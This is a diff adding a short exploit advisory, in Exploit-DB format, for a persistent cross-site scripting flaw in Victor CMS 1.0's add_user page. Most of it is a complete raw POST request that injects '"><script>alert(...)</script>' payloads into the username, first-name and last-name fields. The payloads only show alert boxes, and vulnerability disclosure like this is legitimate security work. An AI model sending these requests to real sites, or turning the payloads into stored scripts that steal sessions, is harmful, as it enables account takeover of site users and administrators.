@@ -1,0 +1,66 @@
+# Exploit Title: Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting
+# Google Dork: N/A 
+# Date: 2020-05-23 
+# Exploit Author: Nitya Nand 
+# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite 
+# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip 
+# Version: 1.0 
+# Tested on: Linux 
+# CVE : N/A
+
+
+Description: The POST parameter 'user_name', 'user_firstname', 'user_lastname' is vulnerable to persistent cross site scripting Payload: <script>alert(1)</script>
+POST /phpmaster/admin/users.php?source=add_user HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/phpmaster/admin/users.php?source=add_user
+Content-Type: multipart/form-data; boundary=---------------------------515906178311115682892435428
+Content-Length: 417375
+Connection: close
+Cookie: PHPSESSID=8810e038f92cd7c711ee8b95db1dcacb
+Upgrade-Insecure-Requests: 1
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="user_name"
+"><script>alert(1)</script>
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="user_firstname"
+"><script>alert(2)</script>
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="user_lastname"
+"><script>alert(3)</script>
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="user_image"; filename="9400.jpg"
+Content-Type: image/jpeg
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="user_role"
+User
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="user_email"
+abc@gmail.com
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="user_password"
+1234
+
+-----------------------------515906178311115682892435428
+
+Content-Disposition: form-data; name="create_user"
+
+Add User
+-----------------------------515906178311115682892435428--
